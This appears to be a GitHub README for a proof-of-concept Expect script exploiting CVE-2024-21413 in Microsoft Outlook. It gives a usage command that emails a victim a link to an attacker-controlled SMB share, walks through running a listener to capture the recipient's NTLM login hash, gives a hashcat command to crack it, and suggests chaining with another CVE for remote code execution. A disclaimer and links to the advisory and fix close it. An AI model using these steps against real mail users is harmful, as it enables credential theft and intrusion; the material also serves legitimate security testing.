# CVE-2024-21413 - Expect Script POC

Microsoft Outlook Leak credentials & Remote Code Execution Vulnerability when chained with CVE-2023-21716 (through the preview panel)
CVSS:3.1 9.8 / 8.5

Outlook should warm you about the risk on opening an external link => but this is not the case!

![image](https://github.com/duy-31/CVE-2024-21413/assets/20819326/3ad8442f-098b-4758-ac82-9ecf8970311f)

usage: ./cve-2024-21413.sh mx.fqdn port sender recipient url

./cve-2024-21413.sh mail.mydomain.com 25 me@home.com to@other.com "\\\\xx.xx.xx.xx\\test\\duy31.txt"

notes: chmod +x cve-2024-21413.sh

require app expect & require legitimate ip sender and email sender (to pass SPF, DKIM, DMARC)

---------------

- First run a smb listener like that
  
![image](https://github.com/duy-31/CVE-2024-21413/assets/20819326/aa7ed0a7-0da1-4555-bcd1-ef498d284c03)

- run the poc

![image](https://github.com/duy-31/CVE-2024-21413/assets/20819326/035b597d-c737-4002-afbb-9964bb5c0505)

- and wait for the email & in the preview windows click on the link

![image](https://github.com/duy-31/CVE-2024-21413/assets/20819326/f85c5add-6f40-47f9-9828-eccbc9788317)


- then you should retrieve the login & hash of the person that clicked on the link (without the warning prompt on affected outlook version)

  ![image](https://github.com/duy-31/CVE-2024-21413/assets/20819326/eabfbb68-adc6-4862-85da-5040fd8e557c)

- You can then try to crack the password with hashcat. Just copy all the line with the login name to a file and run hashcat with module 5600

hashcat -a 0 -m 5600 hash.txt rockyou.txt -o cracked.txt -O

- You can chain this CVE with CVE-2023-21716 to obtain RCE !!! 

-------------------

Kudos: [https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/]

Workaround/Fix: [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413]

-------------------

more about me ;) https://www.linkedin.com/in/duy-huan-bui/

⚠️ Disclaimer: IMPORTANT: This script is provided for educational, ethical testing, and lawful use ONLY. Do not use it on any system or network without explicit permission. Unauthorized access to computer systems and networks is illegal, and users caught performing unauthorized activities are subject to legal actions. The author is NOT responsible for any damage caused by the misuse of this script.
